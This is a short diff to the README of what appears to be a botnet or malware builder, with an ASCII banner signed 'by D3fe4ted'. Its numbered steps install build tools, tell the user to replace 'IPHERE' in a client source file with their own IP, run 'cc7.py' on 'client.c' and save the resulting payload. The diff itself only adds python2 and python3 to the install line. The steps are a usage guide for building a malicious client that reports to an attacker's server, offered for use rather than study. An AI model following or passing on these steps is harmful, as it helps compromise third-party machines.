@@ -14,7 +14,7 @@
 |__  _|_____|___|_|      |_| |___|_|  
    |__|                               by D3fe4ted
 
-1. sudo apt install python screen gcc nano perl
+1. sudo apt install python2 python3 screen gcc nano perl
 2. go to client and replace all "IPHERE"'s to your IP
 3. python2 cc7.py client.c (ip)
 4. Save your payload
